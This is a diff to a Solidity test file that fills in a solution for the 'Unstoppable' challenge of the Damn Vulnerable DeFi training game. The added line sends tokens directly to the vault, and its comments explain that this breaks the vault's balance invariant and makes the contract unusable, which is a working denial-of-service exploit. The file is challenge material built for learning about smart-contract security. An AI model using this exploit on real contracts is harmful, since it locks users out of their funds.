@@ -90,8 +90,19 @@ contract UnstoppableChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    // Solution for the "Unstoppable" challenge in Damn Vulnerable DeFi
+    // This solution exploits the fact that the Unstoppable Vault contract relies 
+    // on an invariant: the `poolBalance` variable must equal the actual token 
+    // balance of the contract. By transferring tokens directly to the vault 
+    // without interacting with its functions, we can break this invariant, 
+    // rendering the contract unusable for future interactions.
+
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Transfer tokens directly to the vault's address
+        // This creates a mismatch between the `poolBalance` variable (internal state)
+        // and the actual token balance of the vault (external state).
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
